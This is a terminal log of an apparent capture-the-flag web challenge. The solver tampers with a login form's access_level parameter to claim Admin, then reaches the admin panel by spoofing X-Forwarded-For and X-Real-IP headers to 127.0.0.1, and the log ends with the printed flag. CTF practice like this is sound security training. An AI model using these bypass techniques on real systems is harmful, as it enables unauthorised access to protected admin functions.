(vantrex㉿kali)-[/home]
└─$ curl -s http://54.72.82.22:8085/ | sed -n '1,240p'


        <h2>Login</h2>
        <!-- Admins must have 'Admin' from the access level to proceed -->
        <form id="login-form">
            Username: <input name="username" id="username"><br>
            Access Level: 
            <select name="access_level" id="access_level">
                <option value="user">User</option>
            </select><br>
            <button type="submit">Login</button>
        </form>
        <div id="response"></div>

        <script>
            document.getElementById("login-form").addEventListener("submit", async function(e) {
                e.preventDefault();

                const username = document.getElementById("username").value;
                const accessLevel = document.getElementById("access_level").value;

                const res = await fetch("/", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-Forwarded-For": "8.8.8.8"
                    },
                    body: `username=${encodeURIComponent(username)}&access_level=${encodeURIComponent(accessLevel)}`
                });

                const html = await res.text();
                // Replace the entire body with response content
                document.body.innerHTML = html;
            });
        </script>
                                                                                                                      
┌──(vantrex㉿kali)-[/home]
└─$ curl -s -X POST \
>   -H "Content-Type: application/x-www-form-urlencoded" \
>   -H "X-Forwarded-For: 8.8.8.8" \
>   --data "username=vantrex&access_level=Admin" \
>   http://54.72.82.22:8085/

            <h2>Hello, vantrex</h2>
            <!--x real admins use internal tools -->
            <p>Access level: Admin</p>
            <p><a href="/admin">Go to admin panel</a></p>
                                                                                                                          
┌──(vantrex㉿kali)-[/home]
└─$ curl -s -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: 8.8.8.8" \
  --data "username=vantrex&access_level=Admin" \
  http://54.72.82.22:8085/


            <h2>Hello, vantrex</h2>
            <!--x real admins use internal tools -->
            <p>Access level: Admin</p>
            <p><a href="/admin">Go to admin panel</a></p>
                                                                                                                          
┌──(vantrex㉿kali)-[/home]
└─$ curl -s -H "X-Forwarded-For: 8.8.8.8" http://54.72.82.22:8085/admin | sed -n '1,240p'

Access denied: Admins only....try harder!                                                                                                                  
┌──(vantrex㉿kali)-[/home]
└─$ curl -s -H "X-Forwarded-For: 127.0.0.1" http://54.72.82.22:8085/admin | sed -n '1,240p'

Access denied: Admins only....try harder!                                                                                                                  
┌──(vantrex㉿kali)-[/home]
└─$ curl -s -H "X-Forwarded-For: 10.0.0.1" -H "X-Real-IP: 127.0.0.1" http://54.72.82.22:8085/admin | sed -n '1,240p'

<h3>Welcome, admin!</h3><p>Flag: safctf{c0f1ec1fccb2de4a03031037251f21a7}</p> 